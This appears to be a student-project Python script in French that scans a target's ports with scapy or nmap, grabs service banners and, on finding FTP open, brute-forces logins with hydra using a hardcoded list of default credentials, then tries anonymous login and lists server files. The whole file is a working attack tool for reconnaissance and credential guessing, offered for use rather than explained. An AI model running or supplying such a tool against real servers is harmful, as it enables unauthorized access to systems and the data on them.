import subprocess
from scapy.all import *
import socket
from ftplib import FTP

ftp_dict = [
    ("admin", "admin"),
    ("user", "password"),
    ("test", "123456"),
    ("ftp", "ftp"),
    ("root", "toor"),
    ("kamtchuing", "projet"),
]

def ftp_anonymous_access(target, port=21):
    print(f"Tentative d'accès anonyme FTP sur {target}:{port}...")
    try:
        ftp = FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login()
        print("Connexion anonyme réussie ! Fichiers présents sur le serveur FTP:")
        files = ftp.nlst()
        for f in files:
            print(f)
        ftp.quit()
    except Exception as e:
        print(f"Accès anonyme impossible: {e}")

def brute_force_ftp(target, port=21, dict_list=ftp_dict):
    print(f"Lancement de l'attaque brute force FTP sur {target}:{port}...")
    success = False
    for username, password in dict_list:
        cmd = [
            "hydra",
            "-l", username,
            "-p", password,
            f"{target}",
            "ftp",
            "-s", str(port)
        ]
        print(f"Test avec {username}:{password}")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            if "login:" in result.stdout:
                print(f"Succès: {username}:{password}")
                success = True
                choix = input("Voulez-vous lister les fichiers présents sur le serveur FTP ? (oui/non): ").lower()
                if choix == "oui":
                    try:
                        ftp = FTP()
                        ftp.connect(target, port, timeout=5)
                        ftp.login(username, password)
                        print("Fichiers présents sur le serveur FTP:")
                        files = ftp.nlst()
                        for f in files:
                            print(f)
                        ftp.quit()
                    except Exception as e:
                        print(f"Erreur lors de la connexion FTP: {e}")
                break
        except Exception as e:
            print(f"Erreur Hydra: {e}")
    if not success:
        print("Aucun identifiant valide n'a pu être trouvé pour le FTP.")
        print("Voulez-vous tenter une autre méthode d'exploitation ?")
        print("1. Tentative d'accès anonyme FTP")
        print("2. Quitter")
        choix = input("Votre choix (1/2): ")
        if choix == "1":
            ftp_anonymous_access(target, port)
        else:
            print("Fin de l'exploitation FTP.")
    print("Attaque brute force terminée.")

def detect_service_version(target, port=None, use_nmap=False):
    if use_nmap:
        if port:
            print(f"Détection du service/version avec nmap sur {target}:{port}")
            try:
                result = subprocess.run(["nmap", "-sV", "-p", str(port), target], capture_output=True, text=True)
                print(result.stdout)
            except Exception as e:
                print(f"Erreur lors de l'exécution de nmap : {e}")
        else:
            print(f"Liste des services disponibles avec nmap sur {target}")
            try:
                result = subprocess.run(["nmap", "-sV", "-p-", target], capture_output=True, text=True)
                print(result.stdout)
                # Extraction des ports ouverts
                open_ports = []
                for line in result.stdout.splitlines():
                    if "/tcp" in line and "open" in line:
                        port_num = line.split("/")[0].strip()
                        open_ports.append(port_num)
                if open_ports:
                    choix = input("Des ports ouverts ont été détectés. Voulez-vous en exploiter un ? (oui/non): ").lower()
                    if choix == "oui":
                        print("Ports ouverts:")
                        for idx, p in enumerate(open_ports):
                            print(f"{idx+1}. Port {p}")
                        sel = input("Sélectionnez le numéro du port à exploiter: ")
                        try:
                            sel_idx = int(sel) - 1
                            port_sel = int(open_ports[sel_idx])
                            if port_sel == 21:
                                print("Attaques possibles sur FTP:")
                                print("1. Brute force avec Hydra")
                                attaque = input("Choisissez l'attaque (1): ")
                                if attaque == "1":
                                    brute_force_ftp(target, port=21)
                            else:
                                print("Aucune attaque automatisée disponible pour ce port.")
                        except Exception as e:
                            print(f"Sélection invalide: {e}")
            except Exception as e:
                print(f"Erreur lors de l'exécution de nmap : {e}")
    else:
        if port:
            print(f"Détection du service/version sur {target}:{port} avec scapy")
            try:
                pkt = IP(dst=target)/TCP(dport=port, flags="S")
                resp = sr1(pkt, timeout=2, verbose=0)
                if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
                    ack_pkt = IP(dst=target)/TCP(dport=port, sport=resp[TCP].dport, flags="A", seq=resp[TCP].ack, ack=resp[TCP].seq+1)
                    send(ack_pkt, verbose=0)
                    try:
                        s = socket.socket()
                        s.settimeout(2)
                        s.connect((target, port))
                        s.send(b'\r\n')
                        banner = s.recv(1024)
                        print(f"Port {port} ouvert - Bannière: {banner.decode(errors='ignore')}")
                        s.close()
                    except Exception as e:
                        print(f"Impossible de récupérer la bannière: {e}")
                else:
                    print(f"Port {port} fermé ou filtré, impossible de détecter le service.")
            except Exception as e:
                print(f"Erreur lors de la détection: {e}")
        else:
            print(f"Scan de tous les ports (1-65535) sur {target} avec scapy")
            for port in range(1, 65536):
                pkt = IP(dst=target)/TCP(dport=port, flags="S")
                resp = sr1(pkt, timeout=0.5, verbose=0)
                if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
                    print(f"Port {port} ouvert")
                    try:
                        s = socket.socket()
                        s.settimeout(1)
                        s.connect((target, port))
                        s.send(b'\r\n')
                        banner = s.recv(1024)
                        print(f"Bannière: {banner.decode(errors='ignore')}")
                        s.close()
                    except Exception as e:
                        print(f"Impossible de récupérer la bannière sur le port {port}: {e}")
            print("Scan terminé.")
